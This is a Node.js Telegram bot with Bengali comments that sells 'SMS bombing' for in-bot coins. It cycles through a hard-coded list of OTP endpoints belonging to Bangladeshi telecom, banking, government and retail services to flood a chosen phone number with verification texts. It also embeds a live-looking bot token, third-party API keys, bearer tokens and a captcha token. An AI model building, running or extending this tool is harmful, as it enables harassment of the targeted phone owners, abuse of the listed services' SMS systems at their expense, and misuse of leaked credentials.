const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');
const express = require('express');
const fs = require('fs');

const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
const ADMIN_ID = 5967798239;
const bot = new Telegraf(BOT_TOKEN);

// এক্সপ্রেস সার্ভার (Render এর জন্য)
const app = express();
app.get('/', (req, res) => res.send('Bot is Running!'));
app.listen(process.env.PORT || 3000);

// ডাটাবেস ফাইল পাথ (সহজ ইউজার ডাটা সংরক্ষণের জন্য)
const DB_FILE = './users_db.json';

// ডাটা লোড করা
let userData = {};
if (fs.existsSync(DB_FILE)) {
    userData = JSON.parse(fs.readFileSync(DB_FILE));
}

// ডাটা সেভ করার ফাংশন
function saveDB() {
    fs.writeFileSync(DB_FILE, JSON.stringify(userData, null, 2));
}

// ইউজার চেক বা ক্রিয়েট ফাংশন
function getUser(id) {
    if (!userData[id]) {
        userData[id] = {
            points: 0,
            lastBonus: 0,
            status: 'idle'
        };
        saveDB();
    }
    return userData[id];
}

// API লিস্ট
const SMS_APIS = [
    { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
    { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login", method: "GET", params: p => ({ msisdn: `880${p}`, lang: "en", ng: "0" }) },
    { url: "https://fundesh.com.bd/api/auth/generateOTP", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p, service_key: "" }) },
    { url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: `880${p}` }) },
    { url: "https://gateway.most.gov.bd/auth/oauth/send-otp", method: "POST", headers: { 'Content-Type': 'application/json', 'X-Api-Key': '4rhwlff8q4q860qsb9utv73x12nua8h7' }, data: p => ({ phone: p, name: "User", email: "a@a.com", registration_type: 1, captcha_token: "511fb2f2ed6211d2a471a7af9a0fa140", otp_send: "SMS" }) },
    { url: "https://app.deshal.net/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.shikho.com/auth/v2/send/sms", method: "POST", headers: { 'Content-Type': 'application/json', origin: "https://shikho.com", referer: "https://shikho.com/" }, data: p => ({ phone: "880"+p, type: "student", auth_type: "login", vendor: "shikho" }) },
    { url: "https://api.apex4u.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", params: p => ({ phone: p }) },
    { url: "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile: p }) },
    { url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", method: "POST", headers: { 'Content-Type': 'application/json', appsource: "web" }, data: p => ({ name: "Jubair", msisdn: p, email: "j@j.com", gender: "2", password: "@Test1234", confirm_password: "@Test1234", r_token: "test" }) },
    { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp", method: "GET", params: p => ({ mobile: p }) },
    { url: "https://api.binge.buzz/api/v4/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json', 'x-platform': "web" }, data: p => ({ phone: "+880"+p }) },
    { url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p, intent: "login" }) },
    { url: "https://api-gateway.sundarbancourierltd.com/graphql", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }" }) },
    { url: "https://www.rokomari.com/otp/send", method: "POST", params: p => ({ emailOrPhone: p, countryCode: "BD" }), headers: { 'x-requested-with': "XMLHttpRequest" } },
    { url: "https://offers.sindabad.com/api/mobile-otp", method: "POST", headers: { 'Content-Type': 'application/json', Authorization: "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgbGludXggYW5kcm9pZCAxMyBzbS10ODM3YSBhcHBsZXdlYmtpdDUzNzM2" }, data: p => ({ key: "499a4a6b403417bfd670e45eef1e24b5", mobile: "+88"+p }) },
    { url: "https://piobd.com/login", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `f_mobilenumber=${p}&frf_calculatereg=9` },
    { url: "https://api.shoppingcorner.com.bd/index.php?route=vapi/account/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile_no: p }) },
    { url: "https://chinaonlinebd.com/api/login/getOtp", method: "GET", params: p => ({ phone: p }), headers: { token: "45601f3d391886fcec5f5a3f26780f21" } },
    { url: "https://api.bdtickets.com:20100/v1/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ createUserCheck: true, phoneNumber: "+88"+p, applicationChannel: "WEB_APP" }) },
    { url: "https://auth.acsfutureschool.com/api/v1/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://www.shwapno.com/api/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: "+88"+p }) },
    { url: "https://app.eonbazar.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ method: "otp", mobile: p }) },
    { url: "https://primebazar.com/registration/verification-code-send", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `_token=lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd&type=customer&phone=${p}&country_code=88` },
    { url: "https://bj-x-coder.top/bo_m_ber.php", method: "GET", params: p => ({ phone: p, amount: 1 }) },
    { url: "https://login.teletalk.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: "880" + p }) },
    { url: "https://api.daraz.com.bd/v1/login/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.evaly.com.bd/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api2.sheba.xyz/v2/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.hungrynaki.com/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.foodpanda.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "+880"+p }) },
    { url: "https://api.10minute.school/api/v1/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.bkash.com/checkout/v1.2.0-beta/login/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://nagad.com.bd/api/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
];

bot.use(session());

// কিবোর্ড মেনু
const mainMenu = Markup.keyboard([
    ['🚀 Boom', '💰 Balance'],
    ['🎁 Daily Bonus', 'ℹ️ Info']
]).resize();

// স্টার্ট কমান্ড
bot.start((ctx) => {
    const user = getUser(ctx.from.id);
    ctx.reply(`👋 স্বাগতম!\nআপনার UID: ${ctx.from.id}\nনিচের বাটনগুলো ব্যবহার করুন অথবা সরাসরি /bm লিখুন।`, mainMenu);
});

// কমান্ড ভিত্তিক বোম্বিং (/bm 017xxx 10)
bot.hears(/^\/bm\s+(\d{11})\s+(\d+)$/, async (ctx) => {
    const phone = ctx.match[1];
    const amount = parseInt(ctx.match[2]);
    await startBombing(ctx, phone, amount);
});

// বাটন হ্যান্ডলিং
bot.hears('💰 Balance', (ctx) => {
    const user = getUser(ctx.from.id);
    ctx.reply(`💳 আপনার বর্তমান ব্যালেন্স: ${user.points} কয়েন।`);
});

bot.hears('ℹ️ Info', (ctx) => {
    ctx.reply(`👤 আপনার UID: ${ctx.from.id}\n🛠 Admin: @Tnayem48\n\nকয়েন রিচার্জের জন্য এডমিনের সাথে যোগাযোগ করুন।`);
});

bot.hears('🎁 Daily Bonus', (ctx) => {
    const user = getUser(ctx.from.id);
    const now = Date.now();
    const waitTime = 24 * 60 * 60 * 1000; // ২৪ ঘণ্টা

    if (now - user.lastBonus < waitTime) {
        const remaining = waitTime - (now - user.lastBonus);
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        ctx.reply(`❌ আপনি ইতিমধ্যে বোনাস নিয়েছেন! আরও ${hours} ঘণ্টা পর চেষ্টা করুন।`);
    } else {
        user.points += 100;
        user.lastBonus = now;
        saveDB();
        ctx.reply(`✅ অভিনন্দন! আপনি ১০০ কয়েন ডেইলি বোনাস পেয়েছেন।`);
    }
});

bot.hears('🚀 Boom', (ctx) => {
    const user = getUser(ctx.from.id);
    user.status = 'waiting_phone';
    ctx.reply('📱 মোবাইল নম্বরটি দিন (১১ ডিজিট):');
});

// এডমিন রিচার্জ কমান্ড (/recharge uid amount)
bot.command('recharge', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply("❌ আপনি এডমিন নন!");
    
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply("সঠিক নিয়ম: /recharge [UID] [Amount]");

    const targetId = args[1];
    const amount = parseInt(args[2]);

    if (!userData[targetId]) return ctx.reply("❌ ইউজার খুঁজে পাওয়া যায়নি!");
    
    userData[targetId].points += amount;
    saveDB();
    ctx.reply(`✅ সফল! ইউজার ${targetId} কে ${amount} কয়েন দেওয়া হয়েছে।`);
    bot.telegram.sendMessage(targetId, `🎁 এডমিন আপনার একাউন্টে ${amount} কয়েন যোগ করেছেন!`);
});

// টেক্সট মেসেজ প্রসেসিং
bot.on('text', async (ctx) => {
    const user = getUser(ctx.from.id);
    const text = ctx.message.text;

    if (user.status === 'waiting_phone') {
        if (/^01[3-9]\d{8}$/.test(text)) {
            user.phone = text;
            user.status = 'waiting_amount';
            ctx.reply(`✅ নম্বর: ${text}\nএবারে কতটি SMS পাঠাতে চান (পরিমাণ) লিখুন:`);
        } else {
            ctx.reply("❌ ভুল নম্বর! সঠিক ১১ ডিজিট নম্বর দিন।");
        }
    } else if (user.status === 'waiting_amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 100) {
            ctx.reply("❌ দয়া করে ১ থেকে ১০০ এর মধ্যে সংখ্যা দিন।");
        } else {
            user.status = 'idle';
            await startBombing(ctx, user.phone, amount);
        }
    }
});

// বোম্বিং ফাংশন
async function startBombing(ctx, phone, amount) {
    const user = getUser(ctx.from.id);
    
    if (user.points < amount) {
        return ctx.reply(`❌ আপনার পর্যাপ্ত ব্যালেন্স নেই! \nপ্রয়োজন: ${amount} কয়েন\nআপনার আছে: ${user.points} কয়েন।`);
    }

    ctx.reply(`🚀 কাজ শুরু হচ্ছে...\n📱 নম্বর: ${phone}\n🔢 পরিমাণ: ${amount}\n💰 খরচ: ${amount} কয়েন`);

    let successCount = 0;
    let errorCount = 0;
    let apiIndex = 0;

    while (successCount < amount) {
        const api = SMS_APIS[apiIndex % SMS_APIS.length];
        try {
            const config = {
                method: api.method,
                url: api.url,
                headers: api.headers || {},
                timeout: 5000
            };
            if (api.method === "POST") config.data = api.data(phone);
            else config.params = api.params(phone);

            await axios(config);
            successCount++;
        } catch (err) {
            errorCount++;
        }
        apiIndex++;
        // API এর মাঝে সামান্য গ্যাপ রাখা যাতে ব্লক না হয়
        await new Promise(r => setTimeout(r, 300));
    }

    // কয়েন কাটা
    user.points -= amount;
    saveDB();

    ctx.reply(`✅ সম্পন্ন!\n\n📊 রিপোর্ট:\n🎯 সফল: ${successCount}\n⚠️ ব্যর্থ: ${errorCount}\n💳 অবশিষ্ট ব্যালেন্স: ${user.points} কয়েন`, mainMenu);
}

bot.launch();
